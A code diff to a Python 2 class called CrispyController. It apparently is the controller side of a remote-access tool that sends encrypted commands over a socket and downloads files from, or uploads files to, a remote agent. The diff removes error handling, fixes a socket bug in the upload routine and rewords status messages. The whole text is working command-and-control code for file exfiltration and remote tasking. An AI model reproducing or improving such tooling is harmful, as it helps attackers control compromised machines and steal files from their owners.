@@ -3,7 +3,6 @@ import socket
 import sys
 
 from constants import BANNER, BUFFER_SIZE, EOF_STR
-import subprocess
 
 class CrispyController:  
     def __init__(self, host, port, cipher):
@@ -34,38 +33,32 @@ class CrispyController:
         if os.path.isfile(downFile):
             return False 
         else:   
-            try:
-                with open(downFile, 'wb') as f:
-                    while True:
-                        data = self.cipher.decode(self.sock.recv(BUFFER_SIZE))
-                          
-                        if not data:
-                            break
-                        elif EOF_STR in data: 
-                            f.write(data[:-8])
-                            break
-                        else:
-                            f.write(data)
-                return True
-            except IOError: 
-                return False
+            with open(downFile, 'wb') as f:
+                while True:
+                    data = self.cipher.decode(self.sock.recv(BUFFER_SIZE))
+                       
+                    if not data:
+                        break
+                    elif EOF_STR in data: 
+                        f.write(data[:-8])
+                        break
+                    else:
+                        f.write(data)
+            return True
      
     def uploadFile(self, upFile):
         if os.path.isfile(upFile):
-            try:
-                with open(upFile, 'rb') as f:
-                    while True:
-                        data = f.read(BUFFER_SIZE)
-         
-                        if not data:
-                            self.request.sendall(self.cipher.encode(EOF_STR)) #error happens in here
-                            break
-                        else:
-                            self.sock.sendall(self.cipher.encode(data))
-                return True
-            except IOError:
-                print "IOError"
-                return False
+
+            with open(upFile, 'rb') as f:
+                while True:
+                    data = f.read(BUFFER_SIZE)
+
+                    if not data:
+                        self.sock.sendall(self.cipher.encode(EOF_STR))
+                        break
+                    else:
+                        self.sock.sendall(self.cipher.encode(data))
+            return True
         else:
             return False
 
@@ -85,7 +78,7 @@ class CrispyController:
                     print "{0}\n".format(os.getcwd())
                 elif cmd.startswith('download'):
                     saveMeFile = cmd[9:].split(' ')[1]
-                    print "[+] Downloading " + cmd[9:].split(' ')[0] + "..."
+                    print "[-] Attempting download of " + cmd[9:].split(' ')[0] + "..."
                     self.sock.sendall(self.cipher.encode(cmd + "\n"))
                      
                     if self.receiveFile(saveMeFile):      
@@ -94,9 +87,9 @@ class CrispyController:
                         print "[!] File transfer failed.\n"
                 elif cmd.startswith('upload'):
                     sendMeFile = cmd[7:].split(' ')[0]
-                    print "[+] Uploading " + sendMeFile + "..."
+                    print "[-] Attempting upload of " + sendMeFile + "..."
                     self.sock.sendall(self.cipher.encode(cmd + "\n"))
-                      
+
                     if self.uploadFile(sendMeFile):
                         print "[+] File transfer complete!\n"
                     else:
